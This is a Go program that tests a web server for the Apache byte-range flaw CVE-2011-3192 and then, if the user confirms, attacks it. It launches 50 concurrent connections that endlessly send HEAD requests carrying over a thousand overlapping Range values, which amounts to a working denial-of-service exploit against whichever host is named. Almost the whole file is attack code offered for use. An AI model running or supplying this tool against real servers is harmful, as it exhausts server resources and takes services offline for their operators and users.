package main

/*
		CVE-2011-3192 || Can sıkıntısı Vol Bilmem kaç

		http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2011-3192
 */

import (
	"os"
	"fmt"
	"log"
	"net"
	"sync"
	"strconv"
	"strings"
)

func CheckVuln(url string) bool {
	Range := "0-1"
	for i := 0x0; i != 20; i++ {
		Range += ",5-" + strconv.FormatInt(int64(i), 10)
	}

	conn, err := net.Dial("tcp", url+":80")
	if err != nil {
		log.Fatal(err)
	}

	defer conn.Close()

	Payload := fmt.Sprintf("HEAD / HTTP/1.1\r\nHost:%s\r\nRange:bytes=%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n", url, Range)
	conn.Write([]byte(Payload))
	tmp := make([]byte, 1024)
	conn.Read(tmp)

	if strings.Contains(string(tmp), "Partial") {
		return true
	} else {
		return false
	}

	return false

}

func main() {
	var wg sync.WaitGroup
	choice := ""
	if len(os.Args) != 0x2 {
		fmt.Println("Usage: ./CVE-2011-3192 <host>")
		os.Exit(0x1)
	}

	if CheckVuln(os.Args[0x1]) != true {
		fmt.Printf("Host is not vulnerable!\n")
		os.Exit(0x1)
	} else {
		fmt.Printf("Host is vulnerable!\n")
		fmt.Printf("Do you want use exploit? (Y/N)")

		fmt.Scanf("%s", &choice)
		if choice == "Y" {
			fmt.Printf("Attacking %s!\n", os.Args[0x1])
			for i := 0x0; i != 0x32; i++ {
				go func(url string) {
					wg.Add(0x1)
					conn, err := net.Dial("tcp", url+":80")
					if err != nil {
						log.Fatal(err.Error())
					}
					defer conn.Close()

					Range := "0-1"
					for i := 0x0; i != 0x53A-0x1; i++ {
						Range += ",5-" + strconv.FormatInt(int64(i), 10)
					}

					Payload := fmt.Sprintf("HEAD / HTTP/1.1\r\nHost:%s\r\nRange:bytes=%s\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n", url, Range)

					for {
						conn.Write([]byte(Payload))
					}

				}(os.Args[0x1])
			}
		} else {
			os.Exit(0x1)
		}

	}

	wg.Wait()
}
